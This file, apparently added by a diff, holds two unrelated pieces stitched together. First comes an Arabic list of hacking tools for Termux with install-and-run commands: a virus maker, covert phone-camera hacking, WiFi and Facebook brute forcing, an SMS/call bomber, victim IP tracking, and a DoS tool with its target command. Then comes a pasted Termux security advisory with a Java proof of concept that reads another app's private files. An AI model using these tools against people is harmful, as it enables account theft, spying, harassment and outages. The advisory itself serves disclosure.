@@ -1,0 +1,242 @@
+القوة الغاشمة لأصابة اي جهاز اتلاف بلفايرس:
+https://github.com/noob-hackers/infect
+تحديد موقع دقيق ومباشر :
+https://github.com/noob-hackers/ipdrone
+اداة صناعة فايرس :
+pkg update && pkg upgrade -y 
+
+pkg install git -y 
+
+git clone https://github.com/hackerxphantom/HXP-DUCKY 
+
+cd $HOME 
+
+cd HXP-DUCKY 
+
+ls 
+
+bash hxp_ducky.sh
+
+اداة اختراق كام الجوال بدون تنبيهات بحرية:
+apt update && apt upgrade -y 
+
+apt install git -y 
+
+apt install curl -y 
+
+apt install wget -y 
+
+git clone https://github.com/XPH4N70M/HACK-CAMERA.git 
+
+cd HACK-CAMERA 
+
+bash setup 
+
+اختراق واي فاي قوة الغاشمة : روت اجباري 
+
+git clone https://github.com/mkdirlove/WI-TOOLKIT 
+
+cd WI-TOOLKIT 
+
+chmod +x * 
+
+./install.sh 
+
+sudo python wi-toolkit.py 
+
+sudo python2 wi-toolkit.py 
+
+اداة عمل روت للاندرويد:
+apt update  
+
+$ apt upgrade 
+
+$ pkg install git -y 
+
+$ pkg install python 
+
+$ pkg install pyhton2 
+
+$ git clone https://github.com/MaulanaRyM/FakeRoot 
+
+$ cd FakeRoot 
+
+$ chmod +x * 
+
+$ python2 root.py 
+
+القوة الغاشمة لاختراق فيسبوك : 
+
+apt update && apt upgrade 
+
+apt-get install python-pip 
+
+pip install colorama termcolor requests 
+
+pip install mechanize 
+
+git clone https://github.com/WHITEDH4CKER/FB-BRUTEFORCE 
+
+cd FB-BRUTEFORCE 
+
+python FB-ATTACK.py 
+
+أداة القرصنة الألبانيه!! أدوات لمساعدتك في القرصنه الأخلاقيه، واختراق وسائل التواصل الاجتماعي، ومعلومات الهاتف، وهجوم Gmail، والهجوم على رقم الهاتف، واكتشاف المستخدم، والرسائل القصيره المجهوله واختراق كاميرا الويب • أداه قويه لهجوم DDOS!!
+------------------------------------
+
+pkg install git 
+
+git clone https://github.com/4lbH4cker/ALHacking 
+
+cd ALHacking 
+
+bash alhack.sh 
+
+أداة لجمع معلومات الضحية عبر بروتوكول الإنترنت مع ميزة إظهار رقم الهاتف التثبيت على
+------------------------------------ 
+
+$- apt update 
+
+$- pkg install python3 
+
+$- pkg install python 
+
+$- pip install requests 
+
+$- pip install render 
+
+$- pip install time 
+
+$- pip install bs4 
+
+$- pip install uuid 
+
+$- pip install random 
+
+$- pkg install git 
+
+$- git clone https://github.com/AlmunharifHamoudi/ip.git 
+
+$- cd ip 
+
+$- python ip.py
+
+عبر هاذي الاداه يمكنها ان ترسل كمية هائلة من الرسائل النصية القصيرة والمكالمات إلى هدف واحد 
+
+---- 
+
+pkg update 
+
+pkg install python3 python3-pip git -y 
+
+git clone https://github.com/LimerBoy/Impulse 
+
+cd Impulse/ 
+
+pip3 install -r requirements.txt 
+
+python3 impulse.py --help
+
+
+
+
+
+
+
+
+
+اداه Hammer لعمل دوس تاك على تريمكس
+تعد من اقوى الادوات حيث تم اغلاق بيه العديد من المواقع الاسرائيليه و الاباحيه 
+
+--- 
+
+$ pkg update 
+
+$ pkg upgrade 
+
+$ pkg install python 
+
+$ pkg install git 
+
+$ git clone https://github.com/cyweb/hammer 
+
+$ cd hammer 
+
+$ chmod +x hammer.py 
+
+$ python hammer.py 
+
+$ python3 hammer.py -s IP target -p 80 -t 135 
+
+----------------   
+كلشي 
+https://github.com/mishakorzik/AllHackingTools/blob/main/.github/TOOLS.md 
+
+sqlmap هو أداة مفتوحة المصدر لاختبار الاختراق
+بأتمتة عملية الكشف والاستغلال
+حقن SQL العيوب والاستيلاء على خوادم قاعدة البيانات.
+لأنه يأتي مع محرك كشف قوي ، والعديد من الميزات المتخصصة
+لاختبار الاختراق النهائي ومجموعة واسعة من
+مفاتيح دائمة من البصمات قاعدة البيانات ، على البيانات جلب من قاعدة البيانات ،
+للوصول إلى نظام الملفات الأساسي وتنفيذ الأوامر
+نظام التشغيل عبر اتصالات خارج النطاق.
+التركيب :
+apt update && apt upgrade
+apt install git
+apt install python2
+apt install python
+git clone https://github.com/sqlmapproject/sqlmap
+cd sqlmap
+chmod +x *
+Run : 
+python2 sqlmap.py -h
+It shows all options to use this tool sqlmap
+
+@ali963.sy😎
+
+
+https://insiders.vscode.dev/?vscode-lang=arThe token being previously used and shortcuts created on older versions of Termux:Widget were invalidated so that in case a malicious app already had the token, it could not use it anymore and so that users on Android >= 8 were forced to re-create their shortcuts with safer pinned shortcuts API instead of continuing to use the old unsafer static shortcuts API. (32f344ee)
+
+The canonical path of the executable received by TermuxLaunchShortcutActivity was found before it was processed. Shortcuts that were broken symlinks or whose canonical path was not under the ~/.shortcuts or ~/.termux directory were not shown and execution for the later was not allowed even if the path was sent. (32f344ee, 32f344ee, bcb0ab6c)
+
+Using pinned shortcuts on android version >=8 and not allowing execution of files whose canonical path was not under the ~/.shortcuts or ~/.termux directory provides reasonable security against any arbitrary code execution or privilege escalation. Users who are on Android versions < 8 would still have to use static shortcuts and should be careful about which apps they create a shortcut in, since such apps would be able to execute any scripts under the allowed directories. Users generally should be very careful about which launcher or non-launcher shortcut apps (like Shortcut Maker) they install on their device, since these apps get to execute dangerous shortcuts for apps which can have serious consequences if not protected properly by the apps.
+
+Check Termux:Widget README for more details on new design.
+
+3. Termux Files World Readable
+
+This vulnerability allowed all files under /data/data/com.termux/files to be readable by any app.
+
+The vulnerability existed since v0.47 (2017-02-28) till <= v0.117 and was fixed in v0.118.0 (2022-01-08).
+
+The vulnerability existed in the termux ContentProvider declaration since it had set android.permission.permRead as readPermission. Basically, termux passes the FLAG_GRANT_READ_URI_PERMISSION flag when user requests to open a file with another app, like with termux-open, so the target app doesn't need to have the android.permission.permRead permission to be able to read the file, which also requires grantUriPermissions="true" in the provider element. However, if some app has the permission, it can read any files under files directory as set by termux TermuxOpenReceiver$ContentProvider.openFile().
+
+Issue was that termux did not declare/publish the android.permission.permRead permission, like it does the com.termux.permission.RUN_COMMAND custom permission. Its a dummy permission, likely copied from some tutorial or stackoverflow answer when the ContentProvider was added, since internet searches reveal various random results from different sites for it. It was meant to be replaced with a custom permission published by the app, but it was not. That resulted in any app to just publish the permission in its own AndroidManifest.xml and grant itself the permission with uses-permission entry and then be able to read any files under files directory.
+
+Note that other apps could only read the files, but not write to them since TermuxOpenReceiver$ContentProvider.openFile() returned the ParcelFileDescriptor.MODE_READ_ONLY file mode, so writing was not possible and caller would get java.io.IOException: write failed: EBADF (Bad file descriptor) errors if it tried to write, There was also no writePermission set in the provider element. This at least prevented arbitrary code execution and privilege escalation, which obviously would have been much worse for some cases.
+
+3. Proof Of Concept
+
+The following POC reads the /data/data/com.termux/files/home/.bashrc and writes it to /sdcard/bashrc.txt.
+
+private void runTermuxContentProviderReadCommand(Context context) { Uri uri = Uri.parse("content://com.termux.files/data/data/com.termux/files/home/.bashrc"); //Uri uri = Uri.parse("content://com.termux.files/data/data/com.termux/files/usr/bin/login"); InputStream inputStream = null; FileOutputStream fileOutputStream = null; try { inputStream = context.getContentResolver().openInputStream(uri); File outFile = new File(Environment.getExternalStorageDirectory(), "bashrc.txt"); fileOutputStream = new FileOutputStream(outFile); byte[] buffer = new byte[4096]; int readBytes; while ((readBytes = inputStream.read(buffer)) > 0) { Log.d(LOG_TAG, "data: " + new String(buffer, 0, readBytes, Charset.defaultCharset())); fileOutputStream.write(buffer, 0, readBytes); } } catch (Exception e) { e.printStackTrace(); } finally { try { if (inputStream != null) inputStream.close(); if (fileOutputStream != null) fileOutputStream.close(); } catch (IOException e) { e.printStackTrace(); } } } 
+
+<permission android:name="android.permission.permRead" android:description="@string/permission_termux_provider_description" android:icon="@mipmap/ic_launcher" android:label="Termux Provider" android:protectionLevel="normal" /> <uses-permission android:name="android.permission.permRead" /> 
+
+3. Fix
+
+The dummy android.permission.permRead readPermission was silently replaced with com.termux.permission.RUN_COMMAND in termux ContentProvider declaration. It seemed appropriate to use the same com.termux.permission.RUN_COMMAND permission used for RUN_COMMAND intent and other plugin command executions for accessing files as well since commands can access files anyways, and it would be easier for third party apps to request a single permission. (b62645cd)
+
+The file mode returned by TermuxOpenReceiver$ContentProvider.openFile() which was previously ParcelFileDescriptor.MODE_READ_ONLY was changed to allow both read and write or more specially any file mode defined by ParcelFileDescriptor.parseMode(). With this change, apps that don't have the com.termux.permission.RUN_COMMAND permission are denied access, unless temporary read permission was granted through termux-open. For apps with the permission, they can use something like the following for reading and writing. Note that writing to external storage will fail with File APIs (outFile.createNewFile()) if scoped storage restrictions are being enforced for the calling app, like for targetSdkVersion > 28. (b62645cd)
+
+Sample code to read/write termux files for v0.118.0+  The termux ContentProvider access was only allowed if allow-external-apps was set to true in ~/.termux/termux.properties. This also results in termux-open and xdg-open command to silently fail if value is not set to true in v0.118.0. An error notification will be added in future versions. The caller app like QuickEdit may still show a flash error. Check https://github.com/termux/termux-tasker#allow-external-apps-property-optional on info on how to change the value. Write access through ContentProvider was also disabled for ~/.termux/termux.properties so that apps couldn't modify termux settings without user consent, although they can still do it with RUN_COMMAND intent for now, at least until whitelisting commands is implemented to give users more control. (dcedf394, e302a14c)3. Discussion
+
+All private files like security keys for ssh or encryption keys should be assumed to be compromised for users who were using termux app version <= v0.117 . It is highly advisable to replace any such keys with new ones and look into any suspicious authorized access on any remote servers being connected to from termux.
+
+People who are still using Google Playstore version are advised to immediately shift to F-Droid or Github releases since updates will not be released on Google Playstore any time soon, if ever, due to Android 10 issues. Playstore builds were deprecated more than ~150 days ago and are no longer supported. Check https://github.com/termux/termux-app#installation for more info on where to install/update the Termux app.
+
+Google Playstore, F-Droid and other stores should ideally also add checks to see if any other apps are using android.permission.permRead or android.permission.permWrite permissions or other dummy permissions found in internet searches in the app ContentProvider declarations and notify their devs since those apps would be vulnerable as well to such vulnerabilities. Moreover, any malicious apps declaring or requesting those permissions should also be caught and removed.
+
+It would also be highly appreciated if any other devs review Termux and plugin apps code for any other potential vulnerabilities that may exist so that they can be fixed as well to provide safer environment for users.
+
+apt update && apt upgrade -y
